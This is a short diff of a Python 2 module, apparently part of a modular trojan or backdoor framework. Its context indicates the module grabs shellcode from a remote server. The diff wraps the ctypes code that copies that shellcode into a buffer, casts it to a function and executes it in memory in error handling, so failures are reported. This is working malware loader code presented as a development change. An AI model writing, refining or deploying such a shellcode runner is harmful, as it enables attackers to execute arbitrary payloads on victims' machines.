@@ -13,9 +13,13 @@ def run(**args):
 	except:
 		print "There was a problem while trying to grab the code from the server, exiting module..."
 		return 0, "failed"
-	shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
-	shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))
-	shellcode_func()
+	try:
+		shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
+		shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))
+		shellcode_func()
+	except Exception as Ex:
+		print "Could not run the shell. Exception occured: %s " % Ex.value
+		return 0, "failed"
 	print "Shellcode executed."
 	return 0, "successfully"
 	
